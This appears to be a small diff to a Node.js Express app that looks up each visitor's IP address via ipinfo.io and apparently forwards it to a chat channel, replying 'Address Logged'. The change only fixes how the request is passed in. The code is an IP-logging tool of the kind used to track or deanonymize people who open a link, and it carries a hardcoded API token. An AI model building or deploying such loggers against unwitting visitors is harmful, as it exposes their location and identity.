@@ -7,7 +7,7 @@ const botToken = process.env.bot_token;
 const channelID = process.env.channel_id;
 const port = process.env.port || 3000;
 
-async function sendWebhook() {
+async function sendWebhook(req) {
   const ipAddress = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
   const response = await fetch(`https://ipinfo.io/${ipAddress}?token=2001557f8b906a`);
   const data = await response.json();
@@ -55,7 +55,7 @@ async function sendWebhook() {
 
 app.get('/', async (req, res) => {
   try {
-    await sendWebhook();
+    await sendWebhook(req);
     res.send('Address Logged');
   } catch (error) {
     console.error(`Error handling request: ${error}`);
